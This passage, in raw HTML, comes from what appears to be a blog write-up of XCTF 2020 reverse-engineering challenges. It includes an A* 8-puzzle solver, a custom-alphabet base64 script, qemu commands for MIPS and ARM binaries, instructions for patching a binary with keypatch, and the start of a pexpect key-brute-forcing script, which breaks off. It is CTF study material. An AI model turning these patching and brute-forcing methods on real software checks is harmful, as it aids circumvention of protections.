class="keyword">if</span>(a[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                x = i;y = j;<span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> a[N][N],<span class="keyword">int</span> b[N][N],<span class="keyword">int</span> dir)</span></span>&#123;</span><br><span class="line">    <span class="comment">//1 up 2 down 3 left 4 right</span></span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>,y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j ++)&#123;</span><br><span class="line">            b[i][j] = a[i][j];</span><br><span class="line">            <span class="keyword">if</span>(a[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                x = i;y = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">0</span> &amp;&amp; dir == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(x == N<span class="number">-1</span> &amp;&amp; dir == <span class="number">2</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(y == <span class="number">0</span> &amp;&amp; dir == <span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(y == N<span class="number">-1</span> &amp;&amp; dir == <span class="number">4</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(dir == <span class="number">1</span>)&#123;b[x<span class="number">-1</span>][y] = <span class="number">0</span>;b[x][y] = a[x<span class="number">-1</span>][y];&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(dir == <span class="number">2</span>)&#123;b[x+<span class="number">1</span>][y] = <span class="number">0</span>;b[x][y] = a[x+<span class="number">1</span>][y];&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(dir == <span class="number">3</span>)&#123;b[x][y<span class="number">-1</span>] = <span class="number">0</span>;b[x][y] = a[x][y<span class="number">-1</span>];&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(dir == <span class="number">4</span>)&#123;b[x][y+<span class="number">1</span>] = <span class="number">0</span>;b[x][y] = a[x][y+<span class="number">1</span>];&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">statecpy</span><span class="params">(<span class="keyword">int</span> a[N][N][maxState],<span class="keyword">int</span> b[N][N],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j ++)&#123;</span><br><span class="line">            a[i][j][n] = b[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getState</span><span class="params">(<span class="keyword">int</span> a[N][N][maxState],<span class="keyword">int</span> b[N][N],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j ++)&#123;</span><br><span class="line">            b[i][j] = a[i][j][n];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">statecpy</span><span class="params">(<span class="keyword">int</span> a[N][N],<span class="keyword">int</span> b[N][N])</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; N;j++)</span><br><span class="line">            a[i][j] = b[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">checkAdd</span><span class="params">(<span class="keyword">int</span> a[N][N][maxState],<span class="keyword">int</span> b[N][N],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i ++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(isEqual(a,b,i)) <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Astar</span><span class="params">(<span class="keyword">int</span> a[N][N][maxState],<span class="keyword">int</span> start[N][N],<span class="keyword">int</span> target[N][N],<span class="keyword">int</span> path[maxState])</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> visited[maxState] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fitness[maxState] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> passLen[maxState] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> curpos[N][N];</span><br><span class="line">    statecpy(curpos,start);</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">0</span>,Curid = <span class="number">0</span>;</span><br><span class="line">    fitness[id] = evalute(curpos,target);</span><br><span class="line">    statecpy(a,start,id++);</span><br><span class="line">    <span class="keyword">while</span>(!isEqual(curpos,target))&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">5</span>;i ++)&#123;<span class="comment">//向四周找方向</span></span><br><span class="line">            <span class="keyword">int</span> tmp[N][N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="keyword">if</span>(move(curpos,tmp,i))&#123;</span><br><span class="line">                <span class="keyword">int</span> state = checkAdd(a,tmp,id);</span><br><span class="line">                <span class="keyword">if</span>(state == <span class="number">-1</span>)&#123;<span class="comment">//not add</span></span><br><span class="line">                    path[id] = Curid;</span><br><span class="line">                    passLen[id] = passLen[Curid] + <span class="number">1</span>;</span><br><span class="line">                    fitness[id] = evalute(tmp,target) + passLen[id];</span><br><span class="line">                    statecpy(a,tmp,id++);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;<span class="comment">//add</span></span><br><span class="line">                    <span class="keyword">int</span> len = passLen[Curid] + <span class="number">1</span>,fit = evalute(tmp,target) + len;</span><br><span class="line">                    <span class="keyword">if</span>(fit &lt; fitness[state])&#123;</span><br><span class="line">                        path[state] = Curid;</span><br><span class="line">                        passLen[state] = len;</span><br><span class="line">                        fitness[state] = fit;</span><br><span class="line">                        visited[state] = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[Curid] = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//找到适应度最小的最为下一个带搜索节点</span></span><br><span class="line">        <span class="keyword">int</span> minCur = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; id;i ++)</span><br><span class="line">            <span class="keyword">if</span>(!visited[i] &amp;&amp; (minCur == <span class="number">-1</span> || fitness[i] &lt; fitness[minCur])) minCur = i;</span><br><span class="line">        Curid = minCur;</span><br><span class="line">        getState(a,curpos,Curid);</span><br><span class="line">        <span class="keyword">if</span>(id == maxState) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Curid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> a[N][N][maxState],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------------------\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j &lt; N;j ++)&#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; a[i][j][n] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------------------\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calDe</span><span class="params">(<span class="keyword">int</span> a[N][N])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; N*N;i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>;j &lt; N*N;j ++)&#123;</span><br><span class="line">            <span class="keyword">int</span> m,n,c,d;</span><br><span class="line">            m = i/N;n = i%N;</span><br><span class="line">            c = j/N;d = j%N;</span><br><span class="line">            <span class="keyword">if</span>(a[c][d] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[m][n] &gt; a[c][d]) sum ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">autoGenerate</span><span class="params">(<span class="keyword">int</span> a[N][N])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxMove = <span class="number">50</span>;</span><br><span class="line">    srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">int</span> tmp[N][N];</span><br><span class="line">    <span class="keyword">while</span>(maxMove --)&#123;</span><br><span class="line">        <span class="keyword">int</span> dir = rand()%<span class="number">4</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(move(a,tmp,dir)) statecpy(a,tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[N][N][maxState] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// int start[N][N] = &#123;1,2,3,4,5,6,7,8,0&#125;;</span></span><br><span class="line">    <span class="comment">// autoGenerate(start);</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; start[0][0] &lt;&lt; start[1][1];</span></span><br><span class="line">    <span class="keyword">int</span> start[N][N] = &#123;<span class="number">4</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> target[N][N] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(!(calDe(start)%<span class="number">2</span> == calDe(target)%<span class="number">2</span>))&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无解\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> path[maxState] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> res =  Astar(a,start,target,path);</span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;达到最大搜索能力\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> shortest[maxState] = &#123;<span class="number">0</span>&#125;,j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(res != <span class="number">0</span>)&#123;</span><br><span class="line">        shortest[j++] = res;</span><br><span class="line">        res = path[res];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第 0 步\n&quot;</span>;</span><br><span class="line">    show(a,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = j - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i --)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第 &quot;</span> &lt;&lt; j-i &lt;&lt; <span class="string">&quot; 步\n&quot;</span>;</span><br><span class="line">        show(a,shortest[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到每一步的情况，进而根据switch写出路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">第 0 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 0 3</span><br><span class="line">7 2 6</span><br><span class="line">8 1 5</span><br><span class="line">-------------------------------</span><br><span class="line">第 1 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 2 3</span><br><span class="line">7 0 6</span><br><span class="line">8 1 5</span><br><span class="line">-------------------------------</span><br><span class="line">第 2 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 2 3</span><br><span class="line">7 1 6</span><br><span class="line">8 0 5</span><br><span class="line">-------------------------------</span><br><span class="line">第 3 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 2 3</span><br><span class="line">7 1 6</span><br><span class="line">8 5 0</span><br><span class="line">-------------------------------</span><br><span class="line">第 4 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 2 3</span><br><span class="line">7 1 0</span><br><span class="line">8 5 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 5 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 2 0</span><br><span class="line">7 1 3</span><br><span class="line">8 5 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 6 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 0 2</span><br><span class="line">7 1 3</span><br><span class="line">8 5 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 7 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 1 2</span><br><span class="line">7 0 3</span><br><span class="line">8 5 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 8 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 1 2</span><br><span class="line">7 5 3</span><br><span class="line">8 0 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 9 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 1 2</span><br><span class="line">7 5 3</span><br><span class="line">0 8 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 10 步</span><br><span class="line">-------------------------------</span><br><span class="line">4 1 2</span><br><span class="line">0 5 3</span><br><span class="line">7 8 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 11 步</span><br><span class="line">-------------------------------</span><br><span class="line">0 1 2</span><br><span class="line">4 5 3</span><br><span class="line">7 8 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 12 步</span><br><span class="line">-------------------------------</span><br><span class="line">1 0 2</span><br><span class="line">4 5 3</span><br><span class="line">7 8 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 13 步</span><br><span class="line">-------------------------------</span><br><span class="line">1 2 0</span><br><span class="line">4 5 3</span><br><span class="line">7 8 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 14 步</span><br><span class="line">-------------------------------</span><br><span class="line">1 2 3</span><br><span class="line">4 5 0</span><br><span class="line">7 8 6</span><br><span class="line">-------------------------------</span><br><span class="line">第 15 步</span><br><span class="line">-------------------------------</span><br><span class="line">1 2 3</span><br><span class="line">4 5 6</span><br><span class="line">7 8 0</span><br><span class="line">-------------------------------</span><br><span class="line"></span><br><span class="line">6 左</span><br><span class="line">2 上</span><br><span class="line">4 右</span><br><span class="line">8 下</span><br><span class="line">&#x2F;&#x2F; 884226886224488</span><br></pre></td></tr></table></figure><p>路径为“884226886224488”。</p><p>接下来看主函数里check上面的部分，看到sub_409070()实际上是一个scanf，而dword_4A1B60是我们的输入，也就是最后的flag，中间对输入进行处理以后才得到“884226886224488”这个字符串。</p><p>在里面翻可以翻到一个sub_400B58()，猜测是base64换表编码。</p><p><img src="/p/wpFor-2020XCTF/image-20201229205535378.png"></p><p>于是尝试写脚本编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">b64table=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">mytable=<span class="string">&quot;&quot;</span></span><br><span class="line">offset=<span class="number">-18</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b64table)):</span><br><span class="line">    mytable+=b64table[(i+offset)%<span class="built_in">len</span>(b64table)]</span><br><span class="line">text=<span class="string">&quot;884226886224488&quot;</span>.encode()</span><br><span class="line">cipher=base64.b64encode(text).decode().translate(<span class="built_in">str</span>.maketrans(b64table,mytable))</span><br><span class="line">print(cipher)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2020XCTF/image-20201229210535246.png"></p><p>试试能不能过check。</p><p>wsl运行：（要装qemu才能执行，毕竟特殊架构。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp $(which qemu-mips) .</span><br><span class="line">./qemu-mips -L . ./puzzle</span><br></pre></td></tr></table></figure><p>执行mips程序，输入脚本中解出的字符串，发现成功了，get flag。</p><p><img src="/p/wpFor-2020XCTF/image-20201229210455631.png"></p><p><strong>flag{8xOi6R2k8xOk6R2i7xOm}</strong></p><h2 id="aRm"><a href="#aRm" class="headerlink" title="aRm"></a>aRm</h2><p>arm架构。</p><p>照例通过字符串回溯找到主函数。</p><p><img src="/p/wpFor-2020XCTF/image-20201229220910936.png"></p><p><img src="/p/wpFor-2020XCTF/image-20201229222635806.png"></p><p>v1是key，v9是输入的flag，对输入的限制就是长度为42且头尾是“flag{”和“}”。</p><p>动态调一下可以发现，sub_27770()这个函数实际上是把unk_723A0数组里的42个数据复制到v8里。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./qemu-arm -L ./ -g 12345 ./aRm</span><br></pre></td></tr></table></figure><p>（Debugger选Remote GDB debugger，把端口号填上就好，其余配置具体见<a href="https://c10udlnk.top/p/reSkillsOn-Debugging/">RE套路 - 关于使用IDA 7.0前端进行的动态调试 | c10udlnk_Log</a>中调试elf部分。</p><p>现在我们未知的数就剩v5和v6了，v5要看sub_1714C()的输出，v6这里相当于是42条42元一次方程组（输入未知的情况下）。</p><p>而sub_105B4()是输出42个结果，于是可以知道只要输出了output.txt里的42个数就是正确的flag了。</p><p>由于前面有一个sub_169AC(key)，这边又是一个无参的sub_1714C()+1，于是猜测是srand(seed)和rand()。</p><p>为了证明猜测，多次运行程序输入同一个key和相同&#x2F;不同的flag，发现每一次的v5是一样的，结合rand()的伪随机性，确定这就是随机函数。</p><p>由于key只有一字节（0~255），干脆直接爆破。把output.txt的数据读入，用sympy库解方程，只要第一个解x0等于<code>ord(&#39;f&#39;)^v8[0]=102^0xA0=198</code>，就说明这个key有极大可能性是正确的key。</p><p>当然，在此之前，我们得先知道每一次的v5（即方程的系数）是多少。</p><p>于是hook函数，在v5生成之后复用程序原来就有的print函数及格式符，把每次生成的v5都打印出来。</p><p>还记得有个函数是可以输出八位十六进制数的吧，就是那个sub_105B4()，我们可以用这里面的printf，然后把调用这个函数的地方nop掉（目标要明确，现在是为了爆破key，没必要管程序的正常性hahah）。</p><blockquote><p>本来是想自己堆个调用printf出来的，不知道为什么keypatch对<code>LDR     R0, =a08x</code>解释不了，于是只好绕个小路了。</p></blockquote><p><img src="/p/wpFor-2020XCTF/image-20201230134100558.png"></p><p>转到汇编窗口，记一下这里的loc，等会要跳过来的。</p><p><img src="/p/wpFor-2020XCTF/image-20201230134235154.png"></p><p>看回去原来二重循环里出v5那个地方</p><p><img src="/p/wpFor-2020XCTF/image-20201230134326684.png"></p><p>这几条语句的意思就是f5里面的那行<code>v5 = (unsigned __int8)(sub_1714C() + 1);</code>，我们从再下一行开始改。</p><p>注意可以改的范围在蓝框这里，这是我们不需要的<code>v6[j] += (unsigned __int8)v9[k] * v5;</code>，在这个范围里可以尽情修改，剩下的nop掉。</p><p><img src="/p/wpFor-2020XCTF/image-20201230134904926.png"></p><p>用keypatch直接输入汇编，patch后面的语句为</p><p><img src="/p/wpFor-2020XCTF/image-20201230135257443.png"></p><p>（其实就是改了一行<code>B       loc_105D4</code>，剩下的直接Fill with NOPs就好）</p><p>接下来去往loc_105D4，改造一下。</p><p>我们知道，现在R3寄存器里实际上存的是v5的值，我们调用printf直接输出R3的值就能达成目标。</p><p>在ARM汇编里，函数传参用R0、R1……所以我们这里给R1一个R3的值就好。</p><p><img src="/p/wpFor-2020XCTF/image-20201230135756039.png"></p><p>这里本来就是<code>MOV     R1, R3</code>不用改，所以直接把前面nop掉。</p><p>因为v5那里是取(unsigned __int8)，所以把这里改一下，把”%08x”改成”%02x”，就是出来的v5。</p><p><img src="/p/wpFor-2020XCTF/image-20201230141148584.png"></p><p>别忘了后面还要跳回去，找到地址：</p><p><img src="/p/wpFor-2020XCTF/image-20201230140112007.png"></p><p>patch：</p><p><img src="/p/wpFor-2020XCTF/image-20201230140621270.png"></p><p>记得把调用sub_105B4()的地方也nop掉。</p><p><img src="/p/wpFor-2020XCTF/image-20201230140838366.png"></p><p>最后把patch的字节保存一下。</p><p><img src="/p/wpFor-2020XCTF/image-20201230140754908.png"></p><p>运行测试一下，有：</p><p><img src="/p/wpFor-2020XCTF/image-20201230142921253.png"></p><p>ok，hook成功，开始爆破。</p><blockquote><p>用pexpect进行批量的自动化交互见：<a href="https://c10udlnk.top/p/wpFor-2020chamd5XMAS/">【wp】2020ChaMd5圣诞题 | c10udlnk_Log</a></p><p>多亏了周五做的那个题，才有了这个题的爆破脚本（Doge。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    tmp=f.read().split(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    data=[<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> tmp]</span><br><span class="line">src=[<span class="number">0xA0</span>, <span class="number">0xE4</span>, <span class="number">0xBA</span>, <span class="number">0xFB</span>, <span class="number">0x10</span>, <span class="number">0xDD</span>, <span class="number">0xAC</span>, <span class="number">0x65</span>, <span class="number">0x8D</span>, <span class="number">0x0B</span>, <span class="number">0x57</span>, <span class="number">0x1A</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x96</span>, <span class="number">0xB3</span>, <span class="number">0x0C</span>, <span class="number">0x79</span>, <span class="number">0x4D</span>, <span class="number">0x80</span>, <span class="number">0x90</span>, <span class="number">0x99</span>, <span class="number">0x58</span>, <span class="number">0xFE</span>, <span class="number">0x50</span>, <span class="number">0xD3</span>, <span class="number">0xF9</span>, <span class="number">0x3C</span>, <span class="number">0x0F</span>, <span class="number">0xC1</span>, <span class="number">0xE3</span>, <span class="number">0xA6</span>, <span class="number">0x39</span>, <span class="number">0xC3</span>, <span class="number">0x28</span>, <span class="number">0x75</span>, <span class="number">0xF8</span>, <span class="number">0xC9</span>, <span class="number">0xC8</span>, <span class="number">0xCD</span>, <span class="number">0x78</span>, <span class="number">0x26</span>]</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;000000000000000000000000000000000000&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">var=[]</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    exec(<span class="string">&quot;x&quot;</span>+<span class="built_in">str</span>(num)+<span class="string">&quot;=Symbol(&#x27;x&#x27;+str(num))&quot;</span>)</span><br><span class="line">    var.append(<span class="string">&quot;x&quot;</span>+<span class="built_in">str</span>(num)) <span class="comment">#创建42个变量x0~x41</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    r=pexpect.spawn(<span class="string">&#x27;./qemu-arm -L ./ ./aRm_getRand&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    r.sendline(flag)</span><br><span class="line">    r.readline()</span><br><span class="line">    r.readline()</span><br><span class="line">    rand=[]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>*<span class="number">42</span>):</span><br><span class="line">        s=r.readline()</span><br><span class="line">        rand.append(<span class="built_in">int</span>(<span class="built_in">str</span>(s)[<span class="number">2</span>:<span class="number">-5</span>],<span class="number">16</span>))</span><br><span class="line">    r.wait()</span><br><span class="line">    exper=[]</span><br><span class="line">    <span class="keyword">for</span> 